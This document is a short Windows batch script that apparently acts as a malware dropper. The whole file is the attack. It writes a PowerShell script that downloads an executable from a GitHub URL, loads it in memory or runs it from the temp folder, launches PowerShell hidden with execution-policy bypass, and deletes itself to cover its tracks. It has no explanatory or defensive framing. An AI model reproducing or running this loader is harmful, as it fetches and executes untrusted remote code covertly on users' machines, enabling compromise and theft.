@echo off
set "ps=%temp%\%random%.ps1"
set "url=https://raw.githubusercontent.com/kjhte3/Rocket-Downloader/main/g.exe"

echo $url = '%url%' > "%ps%"
echo $isNet = $false >> "%ps%"
echo try { >> "%ps%"
echo     $data = (New-Object Net.WebClient).DownloadData($url) >> "%ps%"
echo     $asm = [Reflection.Assembly]::Load($data) >> "%ps%"
echo     $isNet = $true >> "%ps%"
echo     $asm.EntryPoint.Invoke($null, $null) >> "%ps%"
echo } catch { >> "%ps%"
echo     $tempFile = [System.IO.Path]::GetTempFileName() + ".exe" >> "%ps%"
echo     [System.IO.File]::WriteAllBytes($tempFile, $data) >> "%ps%"
echo     Start-Process $tempFile >> "%ps%"
echo } >> "%ps%"

start /B powershell -WindowStyle Hidden -ExecutionPolicy Bypass -File "%ps%"
del /f /q "%~f0" >nul 2>&1